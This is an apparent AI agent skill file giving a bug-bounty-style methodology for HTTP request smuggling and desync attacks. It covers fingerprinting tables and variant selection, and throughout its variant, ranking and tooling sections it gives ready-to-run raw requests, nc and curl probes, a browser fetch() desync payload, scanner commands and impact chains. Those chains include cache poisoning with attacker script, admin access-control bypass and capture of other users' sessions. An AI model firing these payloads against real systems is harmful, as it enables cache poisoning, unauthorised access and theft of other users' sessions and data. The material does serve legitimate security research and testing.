---
name: HTTP Request Smuggling
description: Detect and exploit HTTP request smuggling / desync (CL.TE, TE.CL, CL.0, TE.TE, H2.CL, H2.TE, client-side desync) where a front-end proxy and back-end disagree on request boundaries.
tags: [http-smuggling, desync, request-smuggling, http2, cache-poisoning, waf-bypass]
recommended_tools: [http_request, http_repeater, curl, python3, httpx_probe, execute_command, nmap_scan]
vuln_classes: []
domain: web
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [redteam/hunt-http-smuggling/SKILL.md]}
---

# HTTP Request Smuggling (Desync)

HTTP request smuggling exploits a parsing disagreement between a front-end proxy/load-balancer/CDN and a back-end origin server about where one request ends and the next begins. The attacker prepends bytes to a shared keep-alive connection so that a *victim's* subsequent request is prefixed or captured by the smuggled data.

Root cause is inconsistent handling of `Content-Length` (CL) vs `Transfer-Encoding` (TE), or the survival of body-delimiter headers through an HTTP/2 → HTTP/1.1 downgrade. CWE-444 (Inconsistent Interpretation of HTTP Requests / HTTP Request Smuggling).

Lowest dup rate of the common web bugs; historically high-value ($5K–$30K on major CDN+origin stacks). Foundational research: James Kettle / PortSwigger.

## Gate 0 — deterministic proof before you claim it

A timing delta on **your own** follow-up request is only parser disagreement — not exploitable smuggling. Before claiming impact:

1. The smuggled-request effect MUST land on a request issued by a **different client/session** than yours (a second, independent connection or a victim request), OR
2. You capture a follow-up response that unambiguously belongs to the smuggled request (e.g. a 404 for a path you never requested on that connection, or a smuggled marker string reflected back).

If only your own follow-up is affected, downgrade the finding. Cache poisoning and cross-user session capture are the confirmations that make this Critical.

## Target-suitability — fingerprint before you fire

Classic CL.TE / TE.CL is largely dead on modern RFC 9112-strict proxies. Fingerprint the front-end first; do not blast every payload at every target.

| Front-end | CL.TE | TE.CL | H2.CL | H2.TE | Notes |
|---|---|---|---|---|---|
| Nginx >= 1.21 | no | no | partial | partial | RFC-strict; rejects CL+TE with HTTP 400 |
| Caddy 2.x | no | no | — | — | Hardened by default |
| Envoy >= 1.20 | no | no | partial | partial | Hardened in most paths |
| HAProxy <= 2.4 | yes | yes | — | — | Vulnerable — CVE-2021-40346 |
| AWS ALB + specific upstream | partial | partial | yes | yes | Several disclosed-paid reports 2022-2024 |
| Cloudflare → S3 / Lambda chains | — | — | yes | yes | H2-downgrade remains viable |
| Older F5 BIG-IP (TMM < 16) | yes | — | — | — | Vendor advisories |
| Citrix ADC / NetScaler (older fw) | yes | yes | — | — | Disclosed 2020-2022 |
| Squid 3.x | yes | — | — | — | Older deployments |
| Apache Traffic Server (older) | yes | yes | yes | yes | PortSwigger research |
| Custom Python / Go proxies | yes | yes | — | — | Frequently miss RFC enforcement |

### Fingerprint quick-check

```bash
curl -sI https://target/ | grep -iE "^(server:|via:|x-powered-by:|x-served-by:|cf-ray:|akamai|fastly)"
# or via httpx: stack detection + status + server banner
httpx -u "https://target/" -td -sc -server
```

- `nginx/1.21+`, `Caddy`, `envoy` → CL/TE classic is dead; pivot to H2.CL/H2.TE if the front-end speaks HTTP/2, or hunt legacy proxies upstream.
- `HAProxy`, or AWS/CDN headers → run the full payload matrix.
- No `Server` header → assume hardened, but fire one `space-before-colon` probe; if it doesn't 400, dig deeper.

## Ordered methodology

1. Fingerprint the front-end stack (above).
2. Choose the variant that matches the stack (stack table below); do NOT fire all payloads — wasted requests burn recon time.
3. Send a timing/differential probe. Timing delta > ~3-5s on a probe = escalate.
4. Confirm desync with a follow-up-response capture (Gate 0), using a second connection where possible.
5. Score the target (HA Rank below). On rank >= 3, write the full exploit chain (cache poison / auth bypass / session capture).

### Stack → variant selection

| Detected stack | Primary test | Secondary test | Skip |
|---|---|---|---|
| nginx 1.21+ | H2.CL (if H2) | H2.TE | CL.TE, TE.CL, CL.0 |
| Caddy 2.x | H2.TE (H2 default) | — | all others |
| HAProxy <= 2.4 | CL.TE | TE.CL, TE.TE obfuscation | H2 (no support) |
| Envoy 1.20+ | H2.CL (if H2 fronting) | CL.0 (custom upstream) | CL.TE, TE.CL |
| AWS ALB | H2.TE | H2.CL, CL.0 | CL.TE (ALB strips TE on H1) |
| Cloudflare | H2.CL (downgrade to origin) | H2.TE | CL.TE (CF edge RFC strict) |
| Akamai | TE.TE obfuscation | H2.CL | CL.TE |
| Fastly | CL.0 (known Fastly behavior) | H2.TE | TE.CL |
| Apache httpd 2.4 | TE.TE obfuscation | CL.TE | H2.CL (no native H2) |
| Custom Go/Python proxy | CL.0 | CL.TE, TE.TE | H2 unless confirmed |
| Java/Tomcat behind proxy | H2.TE | CL.0 | TE.CL (Tomcat rejects TE) |

## Variant payloads

### CL.TE (Content-Length front, Transfer-Encoding back)

Front-end uses CL and forwards the whole body; back-end uses TE and stops at `0\r\n\r\n`, leaving the trailing bytes as the start of the next request.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (Transfer-Encoding front, Content-Length back)

Opposite of CL.TE: front-end honours chunked, back-end honours CL. Craft a chunk that the front-end sees as complete while the back-end reads only CL bytes and leaves the rest queued.

### CL.0 desync (back-end ignores Content-Length)

The front-end reads CL and forwards the body; the back-end does NOT parse CL — it reads until connection close. The body bytes dangle as the start of the next request on a keep-alive connection. Likely on custom Go/Python/Rust backends using `r.Body.Read` without enforcing CL, PHP-FPM behind a proxy, and Fastly-fronted origins.

Key indicator: a POST with a mismatched CL that does NOT return HTTP 400 — the backend swallowed the wrong Content-Length silently.

```bash
# CL.0 raw-socket probe: smuggled prefix after the body; backend treats it as next request
{
  printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nConnection: keep-alive\r\n\r\nSMUGGL'
  sleep 2
  printf 'GET /404 HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n'
} | nc -w 10 target.com 443

# CL.0 blind timing probe via curl
curl -s --raw -X POST "https://target.com/" \
  -H "Transfer-Encoding: chunked" -H "Content-Length: 4" \
  -d $'x' --max-time 15 -w "\nHTTP_CODE: %{http_code}\nTIME: %{time_total}\n"
```

### TE.TE obfuscation

Both ends support TE but parse the header differently. Obfuscate so one side sees TE and the other ignores it.

| Variant | Header | Front-end | Back-end |
|---|---|---|---|
| Space before colon | `Transfer-Encoding : chunked` | ignores TE | reads TE |
| Tab injection | `Transfer-Encoding:\tchunked` | skips TE | reads chunked |
| Double header | `Transfer-Encoding: x` + `Transfer-Encoding: chunked` | picks first → skips | picks last → chunked |
| x-chunked | `Transfer-Encoding: xchunked` | no match → no TE | tolerant → reads chunked |
| identity+chunked | `Transfer-Encoding: chunked` then `Transfer-Encoding: identity` | takes first → no TE | takes last → TE |
| Obsolete line fold | `Transfer-Encoding:\r\n chunked` | RFC 7230 folding → ignore | tolerant parser accepts |
| Mixed case | `Transfer-Encoding: ChuNkEd` | strict lowercase → ignores | case-insensitive → accepts |

```bash
# Tab injection
curl -s -X POST "https://target.com/" \
  -H "Transfer-Encoding:\tchunked" -H "Content-Length: 4" \
  -d $'0\r\n\r\n' -w "HTTP_CODE: %{http_code}\n" --max-time 10

# Space before colon
curl -s -X POST "https://target.com/" \
  -H "Transfer-Encoding : chunked" -H "Content-Length: 4" \
  -d $'0\r\n\r\n' -w "HTTP_CODE: %{http_code}\n"

# Double header (front picks first, back picks last)
curl -s -X POST "https://target.com/" \
  -H "Transfer-Encoding: x" -H "Transfer-Encoding: chunked" -H "Content-Length: 4" \
  -d $'0\r\nSMUGGLED\r\n' -w "HTTP_CODE: %{http_code}\n"

# X-chunked variant with a smuggled request
curl -s -X POST "https://target.com/" \
  -H "Transfer-Encoding: xchunked" \
  -d $'0\r\n\r\nGET /404 HTTP/1.1\r\nHost: target.com\r\n\r\n' --max-time 10
```

Interpretation: HTTP 400 on the obfuscated header → front-end is strict (RFC 9112). HTTP 200 but no desync → back-end accepted TE but lacks the opposite parser behavior. Timeout or a follow-up request returning the smuggled response → confirmed TE.TE desync.

### H2.CL desync (HTTP/2 → HTTP/1.1 CL injection)

The attacker sends an HTTP/2 request containing a `content-length` header. The H2 front-end delimits by its own frame length and passes the CL header through to the HTTP/1.1 back-end. The back-end then uses the downgraded CL for delimitation while the front-end already consumed the full frame — desyncing the upstream H1.1 connection. This is the dominant modern vector: most CDN+origin chains speak H2 to the client and H1.1 to origin.

**Netflix case (HackerOne 2021-2022, @defparam, $20k):** Netflix's H2 termination layer forwarded `content-length` into H1.1 upstreams. H2 frame length was 0 (no body) but injected `content-length: 50` told the backend to expect 50 more bytes, so the next request's bytes were consumed as the smuggled body. Impact: cache poisoning of API responses and session hijacking on shared upstream connections. Fixed by stripping `content-length` from all H2→H1.1 downgraded requests.

Manual Burp/repeater probe:
1. Switch protocol to HTTP/2 in the repeater.
2. Ensure the H2 body length is 0.
3. Add `content-length: 100` as a regular header.
4. Place the smuggled request in the DATA frame after the headers.
5. Send, then observe if a subsequent request triggers a 404 for the smuggled path.

### H2.TE desync (HTTP/2 Transfer-Encoding injection)

HTTP/2 removes `Transfer-Encoding` and uses frame-length exclusively. If a front-end downgrades H2→H1.1 and lets `transfer-encoding: chunked` survive, the H1.1 back-end uses TE and waits for chunk boundaries. The attacker sends a complete H2 frame (front-end satisfied) plus a chunked body the back-end never finishes reading → next request bytes consume the chunk body.

**AWS ALB case (2023):** ALB with an HTTP/2 listener → HTTP/1.1 target group passed `transfer-encoding` from H2 requests into the H1.1 upstream. ALB terminated H2 by frame length but included `TE: chunked` in the H1.1 request; the Nginx/httpd origin then read the body as chunked, `0\r\n\r\n` ended the chunk, and subsequent bytes formed a smuggled request. Impact: cache poisoning of ALB-cached responses, credential theft across ALB-connected microservices. Patched — ALB now strips TE on downgrade. (Pattern echoes proxy-desync leverage seen with CVE-2022-22963, Spring Cloud Function.)

ALB is exploitable when: listener protocol is HTTPS/HTTP-2, target group is HTTP/1.1, and the origin parses chunked encoding on keep-alive connections.

### Client-side desync (browser-powered)

Discovered by James Kettle (PortSwigger, 2023). The victim's browser is the smuggler; the proxy and backend are the victims — no direct socket needed. The attacker hosts a page that fires a POST (`keepalive: true`, `no-cors`) whose body the proxy treats as complete but the backend treats as partial, poisoning the browser's connection to the proxy so the victim's next request receives the smuggled response.

Prerequisites: proxy supports H1.1 keep-alive/connection reuse; backend does not consume the full body (CL ignored or chunk mismatch); browser allows `no-cors` + `keepalive: true` (always allowed); victim has an open keep-alive connection to the proxy.

```javascript
// Client-Side Desync probe fired from the victim's browser
fetch('https://target.com/', {
  method: 'POST',
  mode: 'no-cors',
  keepalive: true,
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: '0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n'
});
// Follow-up to see if the connection was poisoned
setTimeout(() => {
  fetch('/dashboard').then(r => r.text())
    .then(t => console.log('DASHBOARD RESPONSE:', t.substring(0, 200)));
}, 1000);
```

```bash
# curl/nc simulation of what the browser sends — POST then GET on the same connection
{
  printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 30\r\nContent-Type: text/plain\r\nConnection: keep-alive\r\n\r\n'
  printf '0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: target.com\r\n'
  sleep 1
  printf 'GET /dashboard HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n'
} | nc -w 10 target.com 80
```

## HTTP Anomaly Rank (HA Rank, 0–5)

| Score | Label | Criteria | Action |
|---|---|---|---|
| 0 | Immune | RFC 9112 strict; 400 on any CL+TE; H2→H1.1 strips body headers | Move on |
| 1 | Low | 200 for CL+TE but no desync; H2 downgrade negative | Note and skip |
| 2 | Moderate | CL+TE accepted; timing shows slight connection stutter; H2 negative | Run automated scanner |
| 3 | High | CL.0 or TE obfuscation confirmed via timing; H2.CL/H2.TE partial desync | Full manual exploit chain |
| 4 | Critical | Desync confirmed with follow-up capture on a second request; cache poison possible | Full chain PoC |
| 5 | Emergency | Verified cache poisoning OR credential theft on a production keep-alive pool | Immediate disclosure |

```bash
# HA Rank quick automation
ha_rank() {
  local t="$1"
  # 1: CL+TE coexistence — does it 400?
  curl -sk -m 10 -X POST "$t/" -H "Content-Length: 4" -H "Transfer-Encoding: chunked" -d $'x' -w "%{http_code}" \
    | grep -q 400 && echo "CL+TE -> 400 (RFC strict)" || echo "CL+TE -> accepted (+1)"
  # 2: timing desync probe
  timeout 15 curl -sk -X POST "$t/" -H "Transfer-Encoding: chunked" \
    -d $'0\r\n\r\nGET / HTTP/1.1\r\nHost: x\r\n\r\n' -w "%{time_total}" 2>/dev/null \
    | awk '{if ($1 > 5) print "Timing desync (+2)"; else print "No timing desync"}'
  # 3: TE.TE tab obfuscation
  curl -sk -m 10 -X POST "$t/" -H $'Transfer-Encoding:\tchunked' -d $'0\r\n\r\n' -w "%{http_code}" \
    | grep -q 400 && echo "TE.TE tab -> blocked" || echo "TE.TE tab -> accepted (+1)"
}
# ha_rank https://target.com
```

## Tooling

- **smuggler.py** (defparam/PortSwigger) — original Python3 CL.TE/TE.CL fuzzer, multi-threaded, auto-detect. HTTP/1.1 only; will NOT find H2 variants.
  ```bash
  python3 smuggler.py -u "https://target.com/" -m POST --timeout 10
  python3 smuggler.py -u "https://target.com/" -m POST -o results.txt
  ```
- **h2csmuggler** (assetnote) — HTTP/2 → HTTP/1.1 downgrade tool, handles raw H2 frames. The right starting point for H2.CL/H2.TE.
  ```bash
  python3 h2csmuggler.py -x "https://target.com" --h2cl --method GET --path "/" \
    --smuggled-path "/api/admin/users" --smuggled-host "internal.target.com"
  python3 h2csmuggler.py -x "https://target.com" --h2te --method POST --path "/login" \
    --body "0\r\n\r\nGET /debug HTTP/1.1\r\nHost: localhost\r\n\r\n"
  python3 h2csmuggler.py -x "https://target.com" --test-all --delay 10
  ```
- **Burp Suite — HTTP Request Smuggler extension** (PortSwigger, Pro): auto Smuggle Probe (CL.TE/TE.CL/TE.TE); H2 smuggler config for H2.CL/H2.TE (Burp 2023.12+); "Smuggle via HTTP/2 downgrade" automates H2 desync; can emit Turbo Intruder scripts.
- **Turbo Intruder** — high-speed desync brute-forcing to find which upstream connection pool is vulnerable.
  ```python
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10, engine=Engine.BURP2)
      for i in range(100):
          engine.queue(target.req, i)
          engine.queue(target.req, i+100)
  def handleResponse(req, interesting):
      if '404' in req.response or 'smuggled' in req.response:
          table.add(req)
  ```

Note: use tools that send real HTTP/2 raw frames against H2-front-ended targets. Do NOT use HTTP/1.1-only clients (plain curl, raw sockets) against H2 front-ends — you'll send the wrong protocol entirely.

## Impact chains

- **Cache poisoning** — the canonical Critical chain. Smuggle a request whose response body carries attacker HTML/JS; the front-end cache stores it under a popular URL (`/`, `/login`), so the smuggled response is served to every subsequent victim for the cache TTL (stored XSS at scale).
- **Auth bypass** — smuggle `GET /admin/users HTTP/1.1` past the front-end ACL that blocks external `/admin/*`; the backend treats it as trusted internal traffic and returns admin data in the response queue.
- **Session / IDOR capture** — smuggle `GET /api/me HTTP/1.1` with no cookies; the backend pairs it with the next legitimate user's incoming connection cookies, attaching the victim's session to the attacker's smuggled request and returning their PII/tokens.
- **Reflected XSS without a URL param** — the smuggled body's reflected payload is rendered into the next response in the queue, hitting the next visitor to `/` with no attacker-visible URL.

Always run Gate 0 before claiming Critical: the smuggled effect must land on a different client/session, not your own follow-up.
